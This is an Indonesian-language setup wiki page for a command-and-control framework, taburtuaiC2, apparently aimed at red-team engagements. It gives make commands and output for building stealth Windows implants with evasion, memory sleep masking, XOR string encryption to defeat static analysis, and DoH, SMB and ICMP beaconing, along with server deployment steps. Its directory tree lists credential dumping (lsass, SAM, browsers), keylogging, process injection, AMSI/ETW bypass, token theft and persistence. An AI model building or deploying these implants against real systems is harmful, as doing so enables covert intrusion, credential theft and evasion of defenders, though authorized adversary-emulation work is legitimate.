# 02 — Setup & Instalasi

## Prasyarat

| Kebutuhan | Versi Min | Catatan |
|-----------|-----------|---------|
| Go | 1.21+ | `go version` untuk cek |
| Make | any | `make --version` |
| Git | any | untuk clone |
| MinGW-w64 (Windows) | 13.0+ | cross-compile CGO untuk Windows |
| `garble` | latest | opsional — obfuskasi binary (`go install mvdan.cc/garble@latest`) |
| `donut` | latest | opsional — EXE → shellcode (`go install github.com/TheWover/donut/...@latest`) |
| `osslsigncode` | 2.x | opsional — Authenticode signing di Linux |
| Server Linux | Ubuntu 22.04+ | rekomendasi untuk C2 server production |

---

## 1. Clone dan Build

```bash
git clone https://github.com/mjopsec/taburtuaiC2.git
cd taburtuaiC2

# Download semua dependensi Go
go mod download && go mod tidy

# Build semua binary sekaligus
make all
```

**Output yang diharapkan:**
```
[*] Building C2 server...
[+] Server: bin/server
[*] Building operator CLI...
[+] Operator: bin/operator
[*] Building generator...
[+] Generator: bin/generate
```

**Cek hasil build:**
```bash
ls -lh bin/
# Contoh output:
# -rwxr-xr-x 1 user user  18M Apr 23 09:15 generate
# -rwxr-xr-x 1 user user  22M Apr 23 09:15 operator
# -rwxr-xr-x 1 user user  19M Apr 23 09:15 server
```

### Build Individual

```bash
make server    # hanya build bin/server
make operator  # hanya build bin/operator
make generate  # hanya build bin/generate
```

---

## 2. Build Agent Windows

Agent dikompilasi dengan konfigurasi yang di-bake ke binary via `-ldflags`. Konfigurasi
**tidak bisa diubah** setelah compile — buat binary baru untuk setiap engagement.

### Stealth Build (Default untuk Engagement)

```bash
make agent-win-stealth \
  C2_SERVER=https://c2.corp.local:8000 \
  ENC_KEY=K3yRah4siaP4nj4ng \
  INTERVAL=60 \
  JITTER=25 \
  KILL_DATE=2026-06-30
```

**Output:**
```
[*] Building Windows stealth agent...
    Server    : https://c2.corp.local:8000
    Interval  : 60s  Jitter: 25%
    Kill date : 2026-06-30
    Transport : http
[+] Windows stealth: bin/agent_windows_stealth.exe (8.4 MB)
```

### Debug Build (untuk Testing Lokal)

```bash
make agent-win-debug \
  C2_SERVER=http://127.0.0.1:8080 \
  ENC_KEY=SpookyOrcaC2AES1
```

**Output:**
```
[*] Building Windows debug agent (console + verbose)...
[+] Debug agent: bin/agent_windows_debug.exe (9.1 MB)
```

### DoH Agent (DNS-over-HTTPS Transport)

```bash
make agent-win-doh \
  C2_SERVER=c2.yourdomain.com \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=doh \
  DOH_PROVIDER=cloudflare
```

### SMB Agent (Named Pipe Transport)

```bash
make agent-win-smb \
  ENC_KEY=K3yRah4sia \
  TRANSPORT=smb \
  SMB_RELAY=10.10.5.3 \
  SMB_PIPE=svcctl
```

### Semua Parameter Build Agent

| Parameter Make | Default | Fungsi |
|----------------|---------|--------|
| `C2_SERVER` | wajib | URL C2 server lengkap |
| `ENC_KEY` | wajib | AES-256-GCM encryption key |
| `INTERVAL` | `30` | Detik antar beacon |
| `JITTER` | `20` | Persen variasi interval |
| `KILL_DATE` | kosong | `YYYY-MM-DD` — agent mati di tanggal ini |
| `EXEC_METHOD` | `powershell` | `cmd`, `powershell`, `wmi`, `mshta` |
| `ENABLE_EVASION` | `true` | Aktifkan fitur evasion bawaan |
| `SLEEP_MASKING` | `true` | XOR enkripsi memori saat idle |
| `TRANSPORT` | `http` | `http`, `doh`, `icmp`, `smb` |
| `DOH_DOMAIN` | kosong | Domain C2 untuk DoH encoding |
| `DOH_PROVIDER` | `cloudflare` | `cloudflare` atau `google` |
| `SMB_RELAY` | kosong | IP SMB relay host |
| `SMB_PIPE` | `svcctl` | Nama named pipe |

> **Aturan kritis:** `ENC_KEY` harus **identik** dengan `ENCRYPTION_KEY` di server.
> Kalau berbeda, agent tidak bisa decrypt perintah → command stuck "pending" selamanya.

### String-Encrypted Build (OPSEC Tertinggi)

```bash
make agent-win-encrypted \
  C2_SERVER=https://c2.corp.local:8000 \
  ENC_KEY=K3yRah4sia
```

Semua string literal di binary (URL, key names, error messages) dienkripsi XOR saat compile.
Statik analisis (`strings`, `FLOSS`, dll) tidak menemukan IoC.

---

## 3. Menjalankan C2 Server

### Cara Minimal

```bash
ENCRYPTION_KEY=K3yRah4siaP4nj4ng ./bin/server --port 8000
```

**Output startup:**
```
[2026-04-23 09:20:00] INFO  Taburtuai C2 Server v1.0
[2026-04-23 09:20:00] INFO  Encryption: AES-256-GCM (key loaded)
[2026-04-23 09:20:00] INFO  Command queue: initialized
[2026-04-23 09:20:00] INFO  Agent monitor: started
[2026-04-23 09:20:00] INFO  Team server: started (0 operators)
[2026-04-23 09:20:00] INFO  HTTP server listening on :8000
[2026-04-23 09:20:00] INFO  Ready to accept agent connections.
```

### Dengan Screen/Tmux (Production)

```bash
# screen
screen -S taburtuai
ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8000
# Ctrl+A, D untuk detach

screen -r taburtuai   # reconnect

# tmux
tmux new -s c2
ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8000
# Ctrl+B, D untuk detach

tmux attach -t c2     # reconnect
```

### Sebagai Systemd Service (Persistent di Server)

```bash
cat > /etc/systemd/system/taburtuai-c2.service << 'EOF'
[Unit]
Description=Taburtuai C2 Server
After=network.target

[Service]
Type=simple
User=taburtuai
WorkingDirectory=/opt/taburtuaiC2
Environment=ENCRYPTION_KEY=K3yRah4siaP4nj4ng
ExecStart=/opt/taburtuaiC2/bin/server --port 8000
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now taburtuai-c2
sudo systemctl status taburtuai-c2
```

**Output status:**
```
● taburtuai-c2.service - Taburtuai C2 Server
     Loaded: loaded (/etc/systemd/system/taburtuai-c2.service; enabled)
     Active: active (running) since Wed 2026-04-23 09:20:00 UTC; 5min ago
   Main PID: 1234 (server)
```

---

## 4. Konfigurasi Firewall Server

```bash
# Ubuntu/Debian — UFW
sudo ufw allow 8000/tcp comment "Taburtuai C2"
sudo ufw reload
sudo ufw status

# CentOS/RHEL — firewalld
sudo firewall-cmd --add-port=8000/tcp --permanent
sudo firewall-cmd --reload

# iptables langsung
sudo iptables -A INPUT -p tcp --dport 8000 -j ACCEPT
sudo iptables-save > /etc/iptables/rules.v4
```

---

## 5. HTTPS dengan Caddy (Rekomendasi Production)

```bash
# Install Caddy
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' \
  | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' \
  | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install caddy

# Konfigurasi reverse proxy dengan auto-TLS
cat > /etc/caddy/Caddyfile << 'EOF'
c2.yourdomain.com {
    reverse_proxy localhost:8000
}
EOF

sudo systemctl enable --now caddy
```

**Setelah HTTPS aktif, build agent dengan URL HTTPS:**
```bash
make agent-win-stealth \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=K3yRah4sia
```

---

## 6. Setup Operator CLI

### Environment Variables (Agar Tidak Perlu Flag Berulang)

```bash
# Tambahkan ke ~/.bashrc atau ~/.zshrc
export TABURTUAI_SERVER=http://172.23.0.118:8000
export TABURTUAI_API_KEY=api-key-jika-ada

# Reload
source ~/.bashrc
```

### Verifikasi Koneksi

```bash
./bin/operator agents list --server http://172.23.0.118:8000
```

**Output (belum ada agent):**
```
[*] Connecting to http://172.23.0.118:8000...
[+] Connected.
[i] No agents registered yet.
```

**Output (ada agent):**
```
[*] Connecting to http://172.23.0.118:8000...
[+] Connected.
[+] Found 3 agent(s):

AGENT ID         HOSTNAME           OS       USERNAME         STATUS   LAST SEEN
2703886d         DESKTOP-QLPBF95    windows  john.doe         online   5s ago
3a14f22b         CORP-WS-042        windows  SYSTEM           online   12s ago
9c821d77         FILESERVER-01      linux    root             offline  3m ago
```

### Membuka Console Interaktif

```bash
./bin/operator console --server http://172.23.0.118:8000
```

**Output:**
```
  ████████╗ █████╗ ██████╗ ██╗   ██╗██████╗ ████████╗██╗   ██╗ █████╗ ██╗
     ██╔══╝██╔══██╗██╔══██╗██║   ██║██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██║
     ██║   ███████║██████╔╝██║   ██║██████╔╝   ██║   ██║   ██║███████║██║
     ██║   ██╔══██║██╔══██╗██║   ██║██╔══██╗   ██║   ██║   ██║██╔══██║██║
     ██║   ██║  ██║██████╔╝╚██████╔╝██║  ██║   ██║   ╚██████╔╝██║  ██║██║
     ╚═╝   ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝
                              C2 Framework v1.0

  [*] Connected to http://172.23.0.118:8000
  [*] Type 'help' for available commands, 'exit' to quit.

taburtuai(172.23.0.118:8000) ›
```

---

## 7. Health Check Server

```bash
curl -s http://localhost:8000/api/v1/health | python3 -m json.tool
```

**Output:**
```json
{
  "success": true,
  "message": "ok",
  "data": {
    "status": "healthy",
    "uptime": "2h34m12s",
    "agents": {
      "total": 3,
      "online": 2,
      "offline": 1
    },
    "command_queue": {
      "total_queued": 0,
      "total_completed": 47
    },
    "version": "1.0.0"
  }
}
```

---

## 8. Struktur Direktori Lengkap

```
taburtuaiC2/
├── bin/                          ← Binary hasil build (gitignored)
│   ├── server
│   ├── operator
│   ├── generate
│   └── agent_windows_stealth.exe
├── cmd/
│   ├── server/main.go            ← Entry point server
│   ├── operator/                 ← Entry point operator CLI + semua subcommand
│   │   ├── main.go
│   │   ├── console.go            ← Interactive console + help
│   │   ├── agent.go              ← agents list/info/delete
│   │   ├── command.go            ← cmd, shell
│   │   ├── file.go               ← files upload/download/list/delete
│   │   ├── inject.go             ← inject remote/self/ppid
│   │   ├── injection.go          ← hollow/hijack/stomp/mapinject
│   │   ├── bypass.go             ← bypass amsi/etw
│   │   ├── token.go              ← token list/steal/make/revert/runas
│   │   ├── recon.go              ← screenshot/keylog
│   │   ├── creds.go              ← creds lsass/sam/browser/clipboard
│   │   ├── evasion.go            ← evasion sleep/unhook/hwbp/bof/opsec
│   │   ├── pivot.go              ← netscan/arpscan/socks5
│   │   ├── registry.go           ← registry read/write/delete/list
│   │   ├── lolbin.go             ← ads/fetch
│   │   ├── persistence.go        ← persistence setup/list/remove
│   │   ├── process.go            ← process list/kill/start
│   │   ├── stage.go              ← stage upload
│   │   └── team.go               ← team operators/subscribe/claim/release
│   ├── generate/main.go          ← Implant builder
│   └── listener/smb_relay.go     ← SMB relay standalone binary
├── agent/                        ← Implant source
│   ├── main.go                   ← Entry point + build vars
│   ├── agent.go                  ← Core beacon loop + all handlers
│   ├── transport.go              ← BeaconTransport interface
│   ├── transport_windows.go      ← DoH/ICMP/SMB adapters (Windows)
│   ├── transport_other.go        ← DoH adapter + stubs (non-Windows)
│   ├── commands.go               ← Command dispatcher
│   ├── inject_windows.go         ← Injection implementations
│   ├── inject_other.go           ← Stubs non-Windows
│   ├── ppid_windows.go           ← PPID spoof
│   ├── ppid_other.go             ← Stub
│   ├── timestomp_windows.go      ← Timestomp
│   ├── timestomp_other.go        ← Stub
│   └── winapi_windows.go         ← Windows API declarations
├── internal/
│   ├── api/                      ← HTTP handlers
│   │   ├── routes.go             ← Route registration
│   │   ├── handlers.go           ← Base handler struct
│   │   ├── helpers.go            ← Shared helpers (enforceAgentWrite, etc)
│   │   ├── agent_handlers.go     ← Checkin, list, info
│   │   ├── command_handlers.go   ← Execute, getNext, submitResult
│   │   ├── bypass_handlers.go    ← AMSI/ETW/token ops
│   │   ├── recon_handlers.go     ← Screenshot/keylog
│   │   ├── inject_handlers.go    ← inject remote/self/timestomp/ppid
│   │   ├── injection_handlers.go ← hollow/hijack/stomp/mapinject
│   │   ├── creds_handlers.go     ← lsass/sam/browser/clipboard
│   │   ├── evasion_handlers.go   ← sleep/unhook/hwbp/bof/opsec
│   │   ├── pivot_handlers.go     ← netscan/arpscan/registry/socks5
│   │   ├── lolbin_handlers.go    ← ads/lolbin-fetch
│   │   ├── file_handlers.go      ← upload/download/list/delete
│   │   ├── stage_handlers.go     ← stage management
│   │   ├── process_handlers.go   ← process management
│   │   └── teamserver_handlers.go← team server + SSE
│   ├── core/server.go            ← Server struct + wiring
│   └── services/
│       ├── monitor.go            ← Agent heartbeat tracking
│       ├── command_queue.go      ← Thread-safe command queue
│       ├── logger.go             ← Structured logging
│       ├── crypto.go             ← AES-256-GCM encrypt/decrypt
│       └── teamserver.go         ← TeamHub (SSE, claiming)
├── pkg/
│   ├── types/types.go            ← Command, Agent, APIResponse structs
│   ├── transport/
│   │   ├── doh.go                ← DNS-over-HTTPS transport
│   │   ├── icmp_windows.go       ← ICMP transport (Windows)
│   │   ├── icmp_other.go         ← Stub
│   │   ├── smb_windows.go        ← SMB named pipe transport
│   │   └── smb_other.go          ← Stub
│   └── strenc/                   ← Compile-time XOR string encryption
├── data/                         ← SQLite DB (auto-created, gitignored)
├── logs/                         ← Log files (auto-created, gitignored)
├── wiki/                         ← Dokumentasi ini
└── Makefile                      ← Build system
```

---

## 9. Troubleshooting Build

| Error | Penyebab | Solusi |
|-------|----------|--------|
| `cc1: error: unrecognized...` | MinGW tidak terinstall | `sudo apt install gcc-mingw-w64-x86-64` |
| `go: module not found` | go.sum tidak sync | `go mod tidy` |
| `undefined: uuid.New` | Dependensi hilang | `go get github.com/google/uuid` |
| Binary size sangat besar | Debug symbols included | `make agent-win-stealth` (bukan debug) |
| `cannot find garble` | garble belum install | `go install mvdan.cc/garble@latest` |

---

**Selanjutnya:** [03 — Quickstart](03-quickstart.md)
